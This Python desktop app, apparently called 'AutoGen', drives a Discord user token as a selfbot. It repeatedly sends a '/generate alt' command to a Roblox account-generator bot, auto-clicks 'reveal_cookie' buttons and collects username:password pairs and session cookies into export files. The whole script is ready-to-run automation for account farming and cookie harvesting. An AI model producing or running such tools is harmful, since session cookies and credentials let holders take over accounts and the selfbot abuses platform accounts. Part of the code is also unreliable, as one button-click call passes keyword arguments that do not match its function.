import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
import threading
import time
import datetime
import requests
import json
import os
from cryptography.fernet import Fernet
import base64

# --- CustomTkinter Settings ---
ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

# --- Constants and Configuration ---
SETTINGS_FILE = "settings.json"
ENCRYPTION_KEY_FILE = "key.key" # File to store the encryption key

# --- Global Variables ---
token = ""
session_id = "your_current_session_id" # Recommended to make this configurable
channel_id = "1327102166233645136"       # Recommended to make this configurable
target_user_id = "1146282764333744169"  # Recommended to make this configurable
application_id_default = "1146282764333744169"

headers = {}
running = False
paused = False
last_message_id = None
last_activity_time = time.time() # Track last time a message was processed or command sent

nickpass_logs = []
cookie_logs = []

exported_nickpass = set()
exported_cookies = set()
exported_combined = set()

# Initialize log_text to None; it will be assigned the actual CTkTextbox object later
log_text = None

# --- GUI Update Functions (placed early so they can be called by other functions) ---
def write_log(text, color="white"):
    """
    Writes text to the GUI log window.
    Supports text color for the log.
    """
    if log_text: # Check if log_text is initialized
        log_text.configure(state='normal')
        log_text.insert(tk.END, f"{datetime.datetime.now().strftime('%H:%M:%S')} | {text}\n", color)
        log_text.see(tk.END) # Auto-scroll to the end
        log_text.configure(state='disabled')
    else:
        # Fallback to console if log_text is not yet created (e.g., during early setup)
        print(f"{datetime.datetime.now().strftime('%H:%M:%S')} | {text}")

def setup_log_tags():
    """Sets up color tags for the log text widget."""
    if log_text:
        log_text.tag_config("red", foreground="#f44336")
        log_text.tag_config("green", foreground="#4caf50")
        log_text.tag_config("orange", foreground="#ff9800")
        log_text.tag_config("blue", foreground="#2196f3")
        log_text.tag_config("gray", foreground="#9e9e9e")
        log_text.tag_config("white", foreground="#f1f1f1")

def update_stats_label():
    """Updates the nick and cookie counts in the GUI."""
    if 'stats_label' in globals() and stats_label:
        nickpass_count = len(set(nickpass_logs))
        cookie_count = len(set(cookie_logs))
        stats_label.configure(text=f"Ников: {nickpass_count} | Куки: {cookie_count}")

def update_timer_label(seconds_left):
    """Updates the timer until the next request."""
    if 'timer_label' in globals() and timer_label:
        timer_label.configure(text=f"Следующий запрос через: {seconds_left}с")

def set_status(text, color="green"):
    """Sets the status text and color."""
    if 'status_label' in globals() and status_label:
        status_label.configure(text=text, text_color=color)

# --- Encryption/Decryption Functions ---
def generate_and_save_key():
    """Generates a new Fernet key and saves it to a file."""
    key = Fernet.generate_key()
    with open(ENCRYPTION_KEY_FILE, "wb") as key_file:
        key_file.write(key)
    write_log(f"Новый ключ шифрования сгенерирован и сохранен в {ENCRYPTION_KEY_FILE}", "blue")
    return key

def load_or_generate_key():
    """Loads an existing key or generates a new one."""
    if os.path.exists(ENCRYPTION_KEY_FILE):
        with open(ENCRYPTION_KEY_FILE, "rb") as key_file:
            return key_file.read()
    else:
        return generate_and_save_key()

encryption_key = load_or_generate_key()
cipher_suite = Fernet(encryption_key)

def encrypt_data(data):
    """Encrypts a string."""
    try:
        return cipher_suite.encrypt(data.encode()).decode()
    except Exception as e:
        write_log(f"[Ошибка шифрования] {e}", "red")
        return ""

def decrypt_data(encrypted_data):
    """Decrypts a string."""
    try:
        return cipher_suite.decrypt(encrypted_data.encode()).decode()
    except Exception as e:
        write_log(f"[Ошибка дешифрования токена] Возможно, ключ шифрования изменился или токен поврежден. Введите токен заново. Детали: {e}", "red")
        return "" # Return empty string on decryption error

# --- Settings Loading/Saving Functions ---
def load_settings():
    """Loads settings from file, decrypting the token."""
    settings = {}
    if os.path.isfile(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r", encoding="utf-8") as f:
                settings_data = json.load(f)
                if "token" in settings_data:
                    decrypted_token = decrypt_data(settings_data["token"])
                    if decrypted_token:
                        settings["token"] = decrypted_token
                    else:
                        write_log("Токен не был загружен из-за ошибки дешифрования.", "red")
        except json.JSONDecodeError:
            write_log("Ошибка чтения settings.json. Файл поврежден или пуст.", "red")
        except Exception as e:
            write_log(f"Неизвестная ошибка при загрузке настроек: {e}", "red")
    return settings

def save_settings(settings_to_save):
    """Saves settings to file, encrypting the token."""
    try:
        settings_copy = settings_to_save.copy()
        if "token" in settings_copy:
            settings_copy["token"] = encrypt_data(settings_copy["token"])
        with open(SETTINGS_FILE, "w", encoding="utf-8") as f:
            json.dump(settings_copy, f, indent=4)
        write_log("Настройки сохранены.", "blue")
    except Exception as e:
        write_log(f"Ошибка сохранения настроек: {e}", "red")

# Initial settings load
settings = load_settings()
token = settings.get("token", "")

# --- Discord API Functions ---
def validate_token(current_token):
    """Performs a test API call to validate the Discord token."""
    if not current_token:
        write_log("Токен пуст. Невозможно проверить.", "red")
        return False
    
    test_headers = {
        "Authorization": current_token,
        "Content-Type": "application/json"
    }
    try:
        response = requests.get("https://discord.com/api/v9/users/@me", headers=test_headers)
        response.raise_for_status() # Raises HTTPError for bad responses (4xx or 5xx)
        write_log("Токен Discord успешно проверен!", "green")
        return True
    except requests.exceptions.HTTPError as e:
        if response.status_code == 401:
            write_log("Ошибка: Неверный или истекший токен Discord. Проверьте ваш токен.", "red")
        else:
            write_log(f"Ошибка проверки токена HTTP: {response.status_code} - {e.response.text}", "red")
        return False
    except requests.exceptions.ConnectionError:
        write_log("Ошибка: Нет соединения для проверки токена. Проверьте интернет.", "red")
    except Exception as e:
        write_log(f"Неизвестная ошибка при проверке токена: {e}", "red")
        return False


def send_command(session_id_val):
    """Sends the '/generate alt' command to the Discord bot."""
    global last_activity_time
    nonce = str(int(time.time() * 1e9))
    payload = {
        "type": 2,
        "application_id": application_id_default,
        "guild_id": "1138184637391319060",
        "channel_id": channel_id,
        "session_id": session_id_val,
        "data": {
            "version": "1368485914262896671",
            "id": "1146283962453471235",
            "guild_id": "1138184637391319060",
            "name": "generate",
            "type": 1,
            "options": [{"type": 1, "name": "alt", "options": []}],
            "application_command": {
                "id": "1146283962453471235",
                "type": 1,
                "application_id": application_id_default,
                "guild_id": "1138184637391319060",
                "version": "1368485914262896671",
                "name": "generate",
                "description": "Генерация аккаунта Roblox определённого типа.",
                "options": [],
                "integration_types": [0],
                "description_localized": "Генерация аккаунта Roblox определённого типа.",
                "name_localized": "generate"
            },
            "attachments": []
        },
        "nonce": nonce,
        "analytics_location": "slash_ui"
    }
    try:
        response = requests.post("https://discord.com/api/v9/interactions", json=payload, headers=headers)
        response.raise_for_status()
        set_status("Команда отправлена. Ожидаю сообщения...", "orange")
        write_log("Команда /generate alt отправлена.", "blue")
        last_activity_time = time.time() # Update activity time
    except requests.exceptions.ConnectionError:
        set_status("Ошибка: Нет соединения с Discord.", "red")
        write_log("Ошибка: Проверьте интернет-соединение.", "red")
    except requests.exceptions.HTTPError as e:
        if response.status_code == 429:
            retry_after = int(response.headers.get("Retry-After", 1))
            set_status(f"Ошибка: Rate Limit. Ожидание {retry_after}с...", "red")
            write_log(f"Discord Rate Limit. Ожидание {retry_after} секунд.", "red")
            time.sleep(retry_after)
        else:
            set_status(f"Ошибка HTTP: {response.status_code}", "red")
            write_log(f"Ошибка HTTP при отправке команды: {e.response.text}", "red")
    except Exception as e:
        set_status("Неизвестная ошибка при отправке команды.", "red")
        write_log(f"Неизвестная ошибка: {e}", "red")

def interact_with_button(message_id_val, channel_id_val, custom_id_val, application_id_val, session_id_val):
    """Interacts with a button in a Discord message."""
    global last_activity_time
    nonce = str(int(time.time() * 1e9))
    payload = {
        "type": 3,
        "application_id": application_id_val,
        "channel_id": channel_id_val,
        "message_id": message_id_val,
        "session_id": session_id_val,
        "data": {
            "component_type": 2,
            "custom_id": custom_id_val
        },
        "nonce": nonce
    }
    try:
        response = requests.post("https://discord.com/api/v9/interactions", json=payload, headers=headers)
        response.raise_for_status()
        write_log(f"Нажата кнопка '{custom_id_val}' для сообщения {message_id_val}.", "blue")
        last_activity_time = time.time() # Update activity time
    except requests.exceptions.ConnectionError:
        write_log("Ошибка: Нет соединения для нажатия кнопки.", "red")
    except requests.exceptions.HTTPError as e:
        if response.status_code == 429:
            retry_after = int(response.headers.get("Retry-After", 1))
            write_log(f"Discord Rate Limit при нажатии кнопки. Ожидание {retry_after} секунд.", "red")
            time.sleep(retry_after)
        else:
            write_log(f"Ошибка HTTP при нажатии кнопки: {e.response.text}", "red")
    except Exception as e:
        write_log(f"Неизвестная ошибка при нажатии кнопки: {e}", "red")

def get_all_dm_channels():
    """Gets all DM channels for the user."""
    try:
        response = requests.get("https://discord.com/api/v9/users/@me/channels", headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.ConnectionError:
        write_log("Ошибка: Нет соединения для получения DM-каналов.", "red")
        return []
    except requests.exceptions.HTTPError as e:
        write_log(f"Ошибка HTTP при получении DM-каналов: {e.response.text}", "red")
        return []
    except Exception as e:
        write_log(f"Неизвестная ошибка при получении DM-каналов: {e}", "red")
        return []

def fetch_dm_messages(dm_channel_id_val):
    """Fetches recent messages from the specified DM channel."""
    try:
        response = requests.get(f"https://discord.com/api/v9/channels/{dm_channel_id_val}/messages?limit=10", headers=headers)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.ConnectionError:
        write_log("Ошибка: Нет соединения для получения DM-сообщений.", "red")
        return []
    except requests.exceptions.HTTPError as e:
        write_log(f"Ошибка HTTP при получении DM-сообщений: {e.response.text}", "red")
        return []
    except Exception as e:
        write_log(f"Неизвестная ошибка при получении DM-сообщений: {e}", "red")
        return []

def find_target_dm_channel():
    """Finds the DM channel with the target user."""
    channels = get_all_dm_channels()
    for ch in channels:
        recipients = ch.get("recipients", [])
        if any(user["id"] == target_user_id for user in recipients):
            write_log(f"Найден DM-канал с {target_user_id}: {ch['id']}", "green")
            return ch["id"]
    write_log(f"Не удалось найти DM-канал с {target_user_id}. Проверьте Target User ID.", "red")
    return None

def process_message_content(message):
    """Обрабатывает содержимое сообщения и добавляет в логи."""
    global nickpass_logs, cookie_logs, last_activity_time
    content = message.get("content", "(пустое сообщение)")

    if content.startswith("_|WARNING"):
        cookie_logs.append(content)
        write_log(f"[КУКИ] Получены новые куки: {content}", "orange") # Более конкретно
    # Проверяем, содержит ли строка формат 'username:password'
    elif ':' in content and all(part for part in content.split(':', 1)):
        # Это простая, но эффективная проверка на наличие двоеточия и непустых частей
        # Если формат более строгий (например, нет пробелов вокруг двоеточия),
        # можно добавить регулярное выражение.
        nickpass_logs.append(content)
        write_log(f"[АККАУНТ] Аккаунт успешно сгенерирован и добавлен в логи: {content}", "green") # Конкретное сообщение об успехе
    else:
        # Для других сообщений от бота, которые не являются куками или аккаунтами
        write_log(f"[СООБЩЕНИЕ] Новое сообщение от бота: {content}", "gray")
        
    update_stats_label()
    last_activity_time = time.time() # Обновляем время активности при любом релевантном сообщении

# --- Main Worker Logic (Thread) ---
def worker():
    global running, paused, last_message_id, session_id, last_activity_time
    dm_channel_id = None
    
    # Define the max inactivity time before status changes to "Ожидание новых аккаунтов..."
    INACTIVITY_THRESHOLD = 120 # seconds (2 minutes)

    while running:
        if dm_channel_id is None:
            set_status("Поиск DM-канала...", "blue")
            dm_channel_id = find_target_dm_channel()
            if not dm_channel_id:
                time.sleep(5) # Wait before retrying channel search
                continue
            
            # Initialize last_message_id by fetching recent messages
            messages_initial = fetch_dm_messages(dm_channel_id)
            if messages_initial:
                messages_sorted_initial = sorted(messages_initial, key=lambda x: int(x["id"]))
                if messages_sorted_initial:
                    last_message_id = messages_sorted_initial[-1]["id"]
                write_log(f"Инициализирован last_message_id: {last_message_id}", "gray")
            else:
                write_log("DM-канал пуст. Жду первого сообщения.", "gray")

        messages = fetch_dm_messages(dm_channel_id)
        new_messages_processed = False
        if messages:
            messages_sorted = sorted(messages, key=lambda x: int(x["id"]))
            for message in messages_sorted:
                if (last_message_id is None or int(message["id"]) > int(last_message_id)) and \
                   message.get("author", {}).get("id") == target_user_id:
                    
                    process_message_content(message)
                    last_message_id = message["id"]
                    new_messages_processed = True

                    components = message.get("components", [])
                    for component in components:
                        for button in component.get("components", []):
                            if button.get("custom_id") == "reveal_cookie":
                                application_id = message.get("application_id", application_id_default)
                                interact_with_button(
                                    message_id=message["id"],
                                    channel_id=dm_channel_id,
                                    custom_id="reveal_cookie",
                                    application_id=application_id,
                                    session_id=session_id
                                )
        
        # Update status based on inactivity
        if not paused:
            if time.time() - last_activity_time > INACTIVITY_THRESHOLD:
                set_status("Ожидание новых аккаунтов...", "gray")
            else:
                set_status("Генерация аккаунта...", "orange")
            send_command(session_id)
            set_status("Ожидание ответа...", "red") # More specific than just "Ожидание..."
        else:
            set_status("Пауза", "gray")

        # Wait loop, checking for new messages
        for i in range(65): # Hardcoded timeout for now, can be made configurable
            if not running:
                break
            update_timer_label(65 - i)
            time.sleep(1)

            # Check for new messages and buttons during waiting
            current_messages = fetch_dm_messages(dm_channel_id)
            if current_messages:
                current_messages_sorted = sorted(current_messages, key=lambda x: int(x["id"]))
                for message in current_messages_sorted:
                    if int(message["id"]) > int(last_message_id) and \
                       message.get("author", {}).get("id") == target_user_id:
                        
                        process_message_content(message)
                        last_message_id = message["id"]
                        new_messages_processed = True # Mark that we processed something

                        components = message.get("components", [])
                        for component in components:
                            for button in component.get("components", []):
                                if button.get("custom_id") == "reveal_cookie":
                                    application_id = message.get("application_id", application_id_default)
                                    interact_with_button(
                                        message["id"],  # Changed from message_id=message["id"]
                                        dm_channel_id,  # Changed from channel_id=dm_channel_id
                                        "reveal_cookie",  # Changed from custom_id="reveal_cookie"
                                        application_id,  # Changed from application_id=application_id
                                        session_id       # Changed from session_id=session_id
                                    )
    set_status("Готов", "green") # After thread stops

# --- Log Export Functions ---
def auto_export_logs():
    """Automatically exports new unique logs."""
    global exported_nickpass, exported_cookies, exported_combined

    new_nickpass = [line for line in set(nickpass_logs) if line not in exported_nickpass]
    new_cookies = [line for line in set(cookie_logs) if line not in exported_cookies]

    if not new_nickpass and not new_cookies:
        return

    try:
        if new_nickpass:
            with open("export_nickpass.txt", "a", encoding="utf-8") as f1:
                for line in new_nickpass:
                    f1.write(line + "\n")
                    exported_nickpass.add(line)

        if new_cookies:
            with open("export_cookies.txt", "a", encoding="utf-8") as f2:
                for line in new_cookies:
                    f2.write(line + "\n")
                    exported_cookies.add(line)

        if new_nickpass and new_cookies:
            # For simplicity, combine the last new nickpass with the last new cookie
            # Note: This doesn't guarantee they are from the same account, just the last received of each type.
            # If you need strict pairing, the logic for collecting logs would need to store pairs.
            combined_line = f"{new_nickpass[-1]} | {new_cookies[-1]}"
            if combined_line not in exported_combined:
                with open("export_nickpass_cookies.txt", "a", encoding="utf-8") as f3:
                    f3.write(combined_line + "\n")
                    exported_combined.add(combined_line)

    except Exception as e:
        write_log(f"[Ошибка автоэкспорта] {e}", "red")

def auto_export_thread_func():
    """Thread for periodic auto-export."""
    while True:
        time.sleep(30)
        if running:
            auto_export_logs()

def clear_log_action():
    """Clears the log text box."""
    if log_text:
        log_text.configure(state='normal')
        log_text.delete("1.0", tk.END)
        log_text.configure(state='disabled')
        write_log("Лог очищен.", "gray")

def export_logs_manual():
    """Manually exports all current unique logs."""
    if not nickpass_logs and not cookie_logs:
        write_log("Нет данных для экспорта.", "gray")
        return

    def append_unique(filename, new_lines_list):
        """Helper to append only unique lines to a file."""
        old_lines = set()
        if os.path.isfile(filename):
            with open(filename, "r", encoding="utf-8") as f:
                old_lines = set(line.strip() for line in f)
        
        added_count = 0
        with open(filename, "a", encoding="utf-8") as f:
            for line in set(new_lines_list):
                if line and line not in old_lines:
                    f.write(line + "\n")
                    old_lines.add(line)
                    added_count += 1
        return added_count

    try:
        added_nickpass = append_unique("export_nickpass.txt", nickpass_logs)
        added_cookies = append_unique("export_cookies.txt", cookie_logs)
        
        write_log(f"Экспортировано {added_nickpass} новых ников в export_nickpass.txt", "blue")
        write_log(f"Экспортировано {added_cookies} новых куков в export_cookies.txt", "blue")

        combined_added_count = 0
        combined_filename = "export_nickpass_cookies.txt"
        current_combined_lines = set()
        if os.path.isfile(combined_filename):
            with open(combined_filename, "r", encoding="utf-8") as f:
                current_combined_lines = set(line.strip() for line in f)

        if nickpass_logs and cookie_logs:
            # This logic for combining the last nickpass and last cookie is simplistic.
            # If a strict pairing is needed (e.g., cookie and nickpass for the *same* account generation event),
            # the log collection mechanism would need to be enhanced to store them as pairs initially.
            last_nickpass = nickpass_logs[-1]
            last_cookie = cookie_logs[-1]
            combined_line = f"{last_nickpass} | {last_cookie}"
            if combined_line not in current_combined_lines:
                with open(combined_filename, "a", encoding="utf-8") as f:
                    f.write(combined_line + "\n")
                    combined_added_count += 1
        
        if combined_added_count > 0:
            write_log(f"Добавлено {combined_added_count} новых комбинированных записей в {combined_filename}", "blue")

        write_log("Ручной экспорт завершен.", "green")
    except Exception as e:
        write_log(f"[Ошибка экспорта] {e}", "red")

# --- Control Functions (Start/Pause/Stop) ---
def start_stop():
    global running, paused, headers, token, worker_thread
    current_token = token_entry.get().strip()
    
    if not current_token:
        messagebox.showwarning("Внимание", "Введите токен Discord!")
        return

    # Validate token before starting
    if not validate_token(current_token):
        messagebox.showerror("Ошибка", "Неверный или недействительный токен Discord. Проверьте ваш токен.")
        return

    # If token is valid, proceed
    token = current_token
    settings["token"] = token
    save_settings(settings)
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }

    if running:
        messagebox.showinfo("Info", "Программа уже запущена")
        return

    running = True
    paused = False
    set_status("Запущено", "green")
    write_log("Программа запущена. Начинаю работу.", "green")

    start_btn.configure(state="disabled", fg_color="#306030")
    pause_btn.configure(state="normal", fg_color="#ff9800")
    stop_btn.configure(state="normal", fg_color="#f44336")
    pause_btn.configure(text="Пауза")

    worker_thread = threading.Thread(target=worker, daemon=True)
    worker_thread.start()

def pause_resume():
    global paused
    if not running:
        messagebox.showinfo("Info", "Программа не запущена")
        return
    paused = not paused
    if paused:
        set_status("Пауза", "gray")
        pause_btn.configure(text="Продолжить", fg_color="#607d8b")
        write_log("Программа на паузе.", "gray")
    else:
        set_status("Работа", "orange")
        pause_btn.configure(text="Пауза", fg_color="#ff9800")
        write_log("Программа возобновлена.", "orange")

def stop():
    global running, paused, worker_thread
    if not running:
        messagebox.showinfo("Info", "Программа не запущена")
        return
    running = False
    paused = False
    set_status("Остановлено", "red")
    write_log("Программа остановлена.", "red")

    start_btn.configure(state="normal", fg_color="#4caf50")
    pause_btn.configure(state="disabled", fg_color="#808080")
    stop_btn.configure(state="disabled", fg_color="#808080")
    pause_btn.configure(text="Пауза")
    update_timer_label(0)

# --- GUI Setup ---
root = ctk.CTk()
root.title("AutoGen")
root.geometry("820x780")
root.resizable(False, False)

main_frame = ctk.CTkFrame(root, corner_radius=15, border_width=1, border_color="#3a3f50")
main_frame.pack(padx=15, pady=15, fill="both", expand=True)

title_label = ctk.CTkLabel(main_frame, text="AutoGen", font=ctk.CTkFont(size=24, weight="bold"))
title_label.pack(pady=(10, 15))

token_frame = ctk.CTkFrame(main_frame, fg_color="#2b2f40", corner_radius=10)
token_frame.pack(fill="x", padx=10, pady=(0, 15))

token_label = ctk.CTkLabel(token_frame, text="Enter token:", font=ctk.CTkFont(size=14))
token_label.pack(anchor="w", padx=10, pady=(10, 3))

token_entry = ctk.CTkEntry(token_frame, placeholder_text="Enter token", show="*", width=580)
token_entry.pack(padx=10, pady=(0, 10), side="left", fill="x", expand=True)
token_entry.insert(0, token) # Insert loaded token

def toggle_token_visibility():
    """Toggles token visibility."""
    if token_entry.cget("show") == "":
        token_entry.configure(show="*")
        toggle_btn.configure(text="Show", fg_color="#4caf50")
    else:
        token_entry.configure(show="")
        toggle_btn.configure(text="Hide", fg_color="#f44336")

toggle_btn = ctk.CTkButton(token_frame, text="Show", width=70, fg_color="#4caf50", command=toggle_token_visibility)
toggle_btn.pack(padx=(5,10), pady=(0,10), side="left")

buttons_frame = ctk.CTkFrame(main_frame, fg_color="#2b2f40", corner_radius=10)
buttons_frame.pack(fill="x", padx=10, pady=(0, 15))

start_btn = ctk.CTkButton(buttons_frame, text="Start", font=ctk.CTkFont(size=14, weight="bold"), fg_color="#4caf50", hover_color="#45a045")
start_btn.pack(side="left", padx=10, pady=10, fill="x", expand=True)

pause_btn = ctk.CTkButton(buttons_frame, text="Pause", font=ctk.CTkFont(size=14), fg_color="#ff9800", hover_color="#e68a00")
pause_btn.pack(side="left", padx=10, pady=10, fill="x", expand=True)

stop_btn = ctk.CTkButton(buttons_frame, text="Stop", font=ctk.CTkFont(size=14), fg_color="#f44336", hover_color="#d7372f")
stop_btn.pack(side="left", padx=10, pady=10, fill="x", expand=True)

pause_btn.configure(state="disabled", fg_color="#808080")
stop_btn.configure(state="disabled", fg_color="#808080")

status_frame = ctk.CTkFrame(main_frame, fg_color="#2b2f40", corner_radius=10)
status_frame.pack(fill="x", padx=10, pady=(0, 15))

status_label = ctk.CTkLabel(status_frame, text="Ready", font=ctk.CTkFont(size=14, weight="bold"), text_color="green")
status_label.pack(side="left", padx=15, pady=10)

stats_label = ctk.CTkLabel(status_frame, text="Nick:Pass: 0 | Cookie: 0", font=ctk.CTkFont(size=14))
stats_label.pack(side="right", padx=15, pady=10)

timer_label = ctk.CTkLabel(main_frame, text="Next message: 0с", font=ctk.CTkFont(size=14))
timer_label.pack(pady=(0, 15))

log_container = ctk.CTkFrame(main_frame, fg_color="#2b2f40", corner_radius=10)
log_container.pack(fill="both", expand=True, padx=10, pady=(0, 15))

log_label = ctk.CTkLabel(log_container, text="Logs", font=ctk.CTkFont(size=16, weight="bold"))
log_label.pack(anchor="w", padx=15, pady=10)

# Assign the CTkTextbox object to the global log_text variable
log_text = ctk.CTkTextbox(log_container, width=780, height=320, state="disabled", fg_color="#1e222d", text_color="#f1f1f1", corner_radius=10)
log_text.pack(padx=15, pady=(0, 15), fill="both", expand=True)
setup_log_tags() # Set up color tags after log_text is created

export_clear_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
export_clear_frame.pack(pady=(0 , 10), fill="x", padx=10)

export_btn = ctk.CTkButton(export_clear_frame, text="Export Logs", font=ctk.CTkFont(size=14), fg_color="#2196f3", hover_color="#1976d2")
export_btn.pack(side="left", expand=True, fill="x", padx=(0, 5))

clear_log_btn = ctk.CTkButton(export_clear_frame, text="Clear Logs", font=ctk.CTkFont(size=14), fg_color="#607d8b", hover_color="#455a64", command=clear_log_action)
clear_log_btn.pack(side="right", expand=True, fill="x", padx=(5, 0))

start_btn.configure(command=start_stop)
pause_btn.configure(command=pause_resume)
stop_btn.configure(command=stop)
export_btn.configure(command=export_logs_manual)

# Start auto-export thread (now safe because log_text is defined)
threading.Thread(target=auto_export_thread_func, daemon=True).start()

root.mainloop()